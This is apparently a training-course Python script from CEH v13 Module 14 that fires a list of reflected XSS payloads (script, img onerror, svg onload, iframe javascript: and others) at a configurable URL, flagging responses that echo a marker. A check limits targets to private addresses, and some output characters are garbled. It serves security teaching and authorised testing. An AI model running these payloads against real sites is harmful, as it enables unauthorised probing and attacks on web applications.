#!/usr/bin/env python3
# LAB-ONLY: Reflected/Stored XSS Scanner & Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/xss.php?input="  # Change to YOUR lab URL
LAB_XSS_PAYLOADS = [
    "<script>alert('LAB-TEST')</script>",
    "<img src=x onerror=alert('LAB-TEST')>",
    "<svg onload=alert('LAB-TEST')>",
    "'\"><script>alert('LAB-TEST')</script>",
    "<body onload=alert('LAB-TEST')>",
    "<iframe src=\"javascript:alert('LAB-TEST')\">",
    "<marquee><h1>LAB-TEST-XSS</h1></marquee>"
]
LAB_CHECK_STR = "LAB-TEST"  # What to look for in response
# -----------------------------------------------------------------------------------

def test_xss(url, payload):
    full_url = f"{url}{requests.utils.quote(payload)}"
    try:
        response = requests.get(full_url, timeout=5, verify=False)
        if LAB_CHECK_STR in response.text:
            return True
        return False
    except Exception as e:
        return False

def main():
    print("="*80)
    print("LAB-ONLY: XSS Scanner & Tester")
    print("="*80)
    print(f"Target URL: {LAB_TARGET_URL}")
    print("Testing XSS payloads (LAB ONLY)...")
    print("-"*80)
    for payload in LAB_XSS_PAYLOADS:
        vulnerable = test_xss(LAB_TARGET_URL, payload)
        status = "ðŸ”´ POSSIBLY VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Payload: {payload:<60} â†’ {status}")
        if vulnerable:
            print(f"   Manual verification needed (check lab browser)!")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY script! Use private lab IPs!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()
